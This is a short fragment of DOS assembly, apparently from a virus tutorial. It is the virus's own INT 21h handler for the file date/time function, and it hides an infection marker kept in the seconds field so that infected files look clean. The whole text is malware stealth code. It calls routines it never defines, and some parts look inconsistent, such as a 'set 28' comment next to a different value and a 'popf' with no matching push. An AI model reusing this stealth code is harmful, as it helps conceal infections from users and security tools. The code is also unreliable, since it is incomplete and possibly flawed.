
int_21:
           ....
           cmp ah,57h        ; this is a part of viral
                             ; INT 21h handler
           je fn_time
           ....              ; here handler continiues



fn_time:
      or al,al            ; get time ?
      je bye1             ; that we don't handle
      pusha
      push es
      call  test_4_executable
      jc fn_time_exit0      ; not executable , skip
      push cx
      call get_time
      jnc uninfected            ; infected ?
      pop cx                  ; yes
      mov ax,cx
      and ax,1f
      xor ax,0e
      je fn_time_exit0      ; 28 seconds ? then let him do it
      pop es
      popa
      push cx
      and cl,11100000b
      xor cl,0f
      jmp set_28            ; otherwise set always 28
fn_time_exit0:
      pop es
      popa
      jmp bye1
uninfected:
      pop cx
      mov ax,cx
      and ax,1f
      xor ax,0e            ; set 28 seconds ?
      jnz fn_time_exit0      ; no exit
set_26:      pop es
      popa
      push cx
      dec cx                  ; set 26 seconds
set_28:      call dosemu
      pop cx                  ; but show 28
      popf
      retf 2

bye1:
      jmp dword ptr cs:[original_INT21h]


